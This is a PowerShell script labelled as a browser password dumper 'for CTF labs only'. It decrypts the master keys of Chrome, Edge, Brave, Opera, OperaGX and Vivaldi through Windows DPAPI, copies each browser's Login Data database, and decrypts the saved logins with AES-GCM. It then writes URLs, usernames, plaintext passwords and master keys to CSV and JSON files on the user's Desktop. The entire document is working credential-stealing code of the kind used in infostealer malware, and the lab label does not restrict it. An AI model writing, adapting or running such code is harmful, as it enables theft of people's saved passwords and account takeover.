# =========================================
# Browser Password Dumper (for CTF labs only)
# Works with: Chrome, Edge, Brave, Opera, OperaGX, Vivaldi
# =========================================

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DPAPI {
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pCipherText,
        string pszDescription,
        ref DATA_BLOB pEntropy,
        IntPtr pReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pPlainText);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    public static byte[] Decrypt(byte[] cipherText) {
        DATA_BLOB cipherBlob = new DATA_BLOB();
        DATA_BLOB plainBlob = new DATA_BLOB();
        DATA_BLOB entropyBlob = new DATA_BLOB();

        try {
            cipherBlob.pbData = Marshal.AllocHGlobal(cipherText.Length);
            cipherBlob.cbData = cipherText.Length;
            Marshal.Copy(cipherText, 0, cipherBlob.pbData, cipherText.Length);

            if (!CryptUnprotectData(ref cipherBlob, null, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, ref plainBlob))
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            byte[] plainText = new byte[plainBlob.cbData];
            Marshal.Copy(plainBlob.pbData, plainText, 0, plainBlob.cbData);
            return plainText;
        }
        finally {
            if (cipherBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(cipherBlob.pbData);
            if (plainBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(plainBlob.pbData);
            if (entropyBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(entropyBlob.pbData);
        }
    }
}
"@

# AES-GCM decryption
function Decrypt-ChromePassword($encryptedBytes, $masterKey) {
    if ($encryptedBytes[0] -eq 118 -and $encryptedBytes[1] -eq 49 -and $encryptedBytes[2] -eq 48) {
        # "v10"/"v11" => AES-GCM
        $iv = $encryptedBytes[3..14]
        $cipherBytes = $encryptedBytes[15..($encryptedBytes.Length-1)]
        $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
        $plaintext = New-Object byte[] ($cipherBytes.Length - 16)
        $tag = $cipherBytes[-16..-1]
        $cipher = $cipherBytes[0..($cipherBytes.Length-17)]
        $aes.Decrypt($iv, $cipher, $tag, $plaintext)
        return [System.Text.Encoding]::UTF8.GetString($plaintext)
    } else {
        # Old DPAPI
        return [System.Text.Encoding]::UTF8.GetString([DPAPI]::Decrypt($encryptedBytes))
    }
}

# Extract and decrypt master key
function Get-MasterKey($localStatePath) {
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encKey = $localState.os_crypt.encrypted_key
    $encKeyBytes = [System.Convert]::FromBase64String($encKey)
    $encKeyBytes = $encKeyBytes[5..($encKeyBytes.Length-1)] # remove DPAPI prefix
    return [DPAPI]::Decrypt($encKeyBytes)
}

# Target browsers
$browsers = @{
    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
    "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
    "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

$results = @()

foreach ($browser in $browsers.Keys) {
    $base = $browsers[$browser]
    if (-not (Test-Path $base)) { continue }

    $localStatePath = Join-Path $base "Local State"
    if (-not (Test-Path $localStatePath)) { continue }

    $masterKey = Get-MasterKey $localStatePath

    $defaultPath = Join-Path $base "Default\Login Data"
    if (-not (Test-Path $defaultPath)) { continue }

    $tempDb = "$env:TEMP\$browser-login.db"
    Copy-Item $defaultPath $tempDb -Force

    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;New=False;Compress=True;")
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $url = $reader.GetString(0)
        $username = $reader.GetString(1)
        $passwordBytes = $reader.GetValue(2)
        if ($passwordBytes.Length -gt 0) {
            try {
                $password = Decrypt-ChromePassword $passwordBytes $masterKey
            } catch {
                $password = "[DecryptionFailed]"
            }
        } else {
            $password = ""
        }
        $results += [PSCustomObject]@{
            Browser   = $browser
            URL       = $url
            Username  = $username
            Password  = $password
            MasterKey = [System.Convert]::ToBase64String($masterKey)
        }
    }
    $reader.Close()
    $conn.Close()
    Remove-Item $tempDb -Force
}

# Export
$results | Export-Csv -Path "$env:USERPROFILE\Desktop\browser_passwords.csv" -NoTypeInformation -Encoding UTF8
$results | ConvertTo-Json | Out-File "$env:USERPROFILE\Desktop\browser_passwords.json" -Encoding UTF8

Write-Host "âœ… Extraction complete. Files saved on Desktop."
